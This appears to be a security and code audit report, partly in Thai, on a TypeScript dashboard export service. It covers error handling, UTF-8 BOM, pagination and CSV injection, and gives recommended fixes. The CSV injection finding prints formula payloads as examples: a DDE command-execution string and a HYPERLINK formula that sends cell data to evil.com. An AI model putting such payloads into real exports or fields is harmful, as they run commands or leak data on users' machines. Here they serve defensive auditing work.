# 🔍 Export Module Audit Report

> **Scope:** [backend/src/modules/dashboard/export.service.ts](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts)  
> **Auditor:** Senior Code Auditor & Security Specialist  
> **Date:** 2026-01-13  
> **Status:** 🔴 **CRITICAL ISSUES FOUND**

---

## Executive Summary

การตรวจสอบ [export.service.ts](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts) พบ **ข้อบกพร่องร้ายแรงหลายจุด** ที่อาจเป็นสาเหตุของ Runtime Error 500 และความเสี่ยงด้าน Security รายละเอียดดังนี้:

| Severity | Count | Category |
|----------|-------|----------|
| 🔴 Critical | 3 | Error Handling, Security |
| 🟠 High | 3 | Memory, Encoding |
| 🟡 Medium | 2 | Code Quality |

---

## 1. 🐞 Error Handling & Stability

### 🔴 CRITICAL-001: Empty Data Handling — Root Cause of 500 Error

**Location:** [export.service.ts:89-93](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L89-L93)

```typescript
// Current problematic code
const parser = new Parser();
const csv = parser.parse(data);  // ❌ Crashes when data = []

return Buffer.from(csv, 'utf-8');
```

**ปัญหา:**
- `json2csv` Parser จะ throw error เมื่อ `data` เป็น empty array `[]`
- ไม่มีการ validate ขนาดข้อมูลก่อน parse
- ไม่มี try-catch ครอบคลุมส่วนนี้

**Error Message ที่เกิด:**
```
Error: Data should not be empty or the fields should be provided
```

**ผลกระทบ:** API Response 500 Internal Server Error

---

### 🔴 CRITICAL-002: No Try-Catch for I/O Operations

**Location:** [export.service.ts:30-94](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L30-L94) และ [export.service.ts:101-270](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L101-L270)

**ปัญหา:**

| Function | Try-Catch | Risk Level |
|----------|-----------|------------|
| [exportCampaignsToCSV()](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#25-95) | ❌ None | Critical |
| [exportMetricsToPDF()](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#96-271) | ❌ None | Critical |

**จุดเสี่ยง:**
1. **Database Query** (Line 45-62): `prisma.campaign.findMany()` อาจ timeout หรือ connection fail
2. **CSV Parsing** (Line 91): `parser.parse()` อาจ throw error
3. **PDF Generation** (Line 123-269): `PDFDocument` อาจ fail

---

### 🟠 HIGH-001: Missing Null/Undefined Guards

**Location:** [export.service.ts:65-87](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L65-L87)

```typescript
// ⚠️ Potential runtime error if c.startDate or c.endDate is null
'Start Date': c.startDate?.toISOString().split('T')[0] || 'N/A',
'End Date': c.endDate?.toISOString().split('T')[0] || 'N/A',
'Created At': c.createdAt.toISOString().split('T')[0], // ❌ No null check!
```

**ปัญหา:**
- `c.createdAt` ไม่มี optional chaining — หาก database มี corrupt data จะ crash
- `c.metrics[0]` อาจเป็น undefined แต่โชคดีที่มี `latestMetric?.` ครอบไว้

---

## 2. 🌍 Localization & Compatibility

### 🟠 HIGH-002: Missing UTF-8 BOM for Thai Language Support

**Location:** [export.service.ts:93](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L93)

```typescript
return Buffer.from(csv, 'utf-8');  // ❌ Missing BOM
```

**ปัญหา:**
Excel บน Windows requires **UTF-8 BOM** (Byte Order Mark) เพื่อแสดงภาษาไทยอย่างถูกต้อง

| Current Behavior | Expected Behavior |
|------------------|-------------------|
| ภาษาไทย แสดง "???" หรือ garbled text | ภาษาไทย แสดงถูกต้อง |

**วิธีแก้ไขที่ถูกต้อง:**
```typescript
const BOM = '\uFEFF';
return Buffer.from(BOM + csv, 'utf-8');
```

---

### 🟡 MEDIUM-001: Hardcoded CSV Delimiter

**ปัญหา:**
`json2csv` ใช้ comma `,` เป็น default delimiter ซึ่งถูกต้องตามมาตรฐาน RFC 4180 แล้ว

**หมายเหตุ:** ไม่พบปัญหาในจุดนี้ — delimiter ถูกต้องตามมาตรฐานสากล ✅

---

## 3. 🛡️ Security & Performance

### 🔴 CRITICAL-003: CSV Injection Vulnerability

**Location:** [export.service.ts:65-87](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L65-L87)

**ปัญหา:**
ไม่มีการ **sanitize** ข้อมูลก่อนเขียนลง CSV — เสี่ยงต่อ **CSV Injection Attack**

```typescript
// ❌ User-controlled data written directly to CSV
'Campaign Name': c.name,  // Could contain: =HYPERLINK("http://malicious.com")
```

**Attack Vector:**
หากผู้ใช้ตั้งชื่อ Campaign ว่า:
```
=CMD|' /C calc'!A0
=HYPERLINK("http://evil.com?data="&A1&B1,"Click Here")
```

เมื่อเปิดไฟล์ CSV ใน Excel จะเกิดการ **Code Execution** หรือ **Data Exfiltration**

**Severity:** Critical (OWASP สูง)

---

### 🟠 HIGH-003: Memory Leak Risk — No Pagination

**Location:** [export.service.ts:45-62](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/export.service.ts#L45-L62)

```typescript
// ❌ Loading ALL campaigns into memory at once
const campaigns = await this.prisma.campaign.findMany({
    where,
    include: {
        metrics: {...},
        googleAdsAccount: {...},
    },
    // No limit! No pagination!
});
```

**ปัญหา:**

| Data Size | Memory Usage | Risk |
|-----------|--------------|------|
| 100 records | ~1 MB | Low |
| 10,000 records | ~100 MB | High |
| 100,000 records | ~1 GB | **OOM Crash** |

**ผลกระทบ:**
- Out of Memory (OOM) error
- Node.js process crash
- Server downtime

---

### 🟡 MEDIUM-002: Content-Type Header Mismatch

**Location:** [dashboard.controller.ts:130-131](file:///c:/Users/User/Desktop/rga-dashboard-cleaned/backend/src/modules/dashboard/dashboard.controller.ts#L130-L131)

```typescript
res.setHeader('Content-Type', 'text/csv');
// ⚠️ Should include charset for UTF-8:
// res.setHeader('Content-Type', 'text/csv; charset=utf-8');
```

---

## 📊 Risk Matrix Summary

```
┌─────────────────────────────────────────────────────────────────┐
│  IMPACT                                                         │
│    ▲                                                            │
│    │                                                            │
│ HIGH│  CRITICAL-001 ●    CRITICAL-003 ●                         │
│    │  (500 Error)       (CSV Injection)                         │
│    │                                                            │
│ MED │  HIGH-002 ●        HIGH-003 ●                              │
│    │  (UTF-8 BOM)       (Memory Leak)                           │
│    │                                                            │
│ LOW │  MEDIUM-002 ●                                              │
│    │  (Content-Type)                                            │
│    │                                                            │
│    └───────────────────────────────────────────────────────────►
│         LOW              MEDIUM             HIGH       LIKELIHOOD
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Recommended Fixes (Priority Order)

### Priority 1: Fix 500 Error (CRITICAL-001 & CRITICAL-002)

```typescript
async exportCampaignsToCSV(...): Promise<Buffer> {
    try {
        const campaigns = await this.prisma.campaign.findMany({...});
        
        // ✅ Handle empty data
        if (!campaigns || campaigns.length === 0) {
            const emptyCSV = 'Campaign ID,Campaign Name,Platform,Status\n';
            return Buffer.from('\uFEFF' + emptyCSV, 'utf-8');
        }
        
        const data = campaigns.map(...);
        
        // ✅ Sanitize data for CSV Injection
        const sanitizedData = data.map(row => 
            Object.fromEntries(
                Object.entries(row).map(([k, v]) => [k, this.sanitizeCSVValue(v)])
            )
        );
        
        const parser = new Parser();
        const csv = parser.parse(sanitizedData);
        
        // ✅ Add UTF-8 BOM
        return Buffer.from('\uFEFF' + csv, 'utf-8');
        
    } catch (error) {
        this.logger.error('CSV Export failed', error);
        throw new InternalServerErrorException('Export failed');
    }
}

private sanitizeCSVValue(value: any): string {
    if (typeof value !== 'string') return value;
    // Remove formula characters at start
    if (/^[=+\-@\t\r]/.test(value)) {
        return "'" + value;  // Prefix with single quote
    }
    return value;
}
```

### Priority 2: Add Streaming for Large Datasets (HIGH-003)

```typescript
// Use cursor-based pagination for large exports
async *exportCampaignsStream(tenantId: string) {
    let cursor = null;
    const batchSize = 1000;
    
    do {
        const campaigns = await this.prisma.campaign.findMany({
            where: { tenantId },
            take: batchSize,
            skip: cursor ? 1 : 0,
            cursor: cursor ? { id: cursor } : undefined,
        });
        
        yield campaigns;
        cursor = campaigns[campaigns.length - 1]?.id;
    } while (campaigns.length === batchSize);
}
```

---

## ✅ Verification Checklist

- [ ] Empty array test: Export with tenant having 0 campaigns
- [ ] UTF-8 test: Create campaign with Thai name "แคมเปญทดสอบ"
- [ ] Injection test: Create campaign name starting with `=CMD`
- [ ] Load test: Simulate 50,000 campaigns export

---

## 📝 Conclusion

| Aspect | Current State | Action Required |
|--------|---------------|-----------------|
| Error Handling | ❌ Critical Gaps | Immediate Fix |
| Localization | ⚠️ Missing BOM | Sprint 5 |
| Security | ❌ CSV Injection | Immediate Fix |
| Performance | ⚠️ No Pagination | Sprint 5-6 |

> **คำแนะนำ:** ควรแก้ไข **CRITICAL-001, 002, 003** ก่อนปล่อย Production ส่วน HIGH issues สามารถทำใน Sprint ถัดไปได้
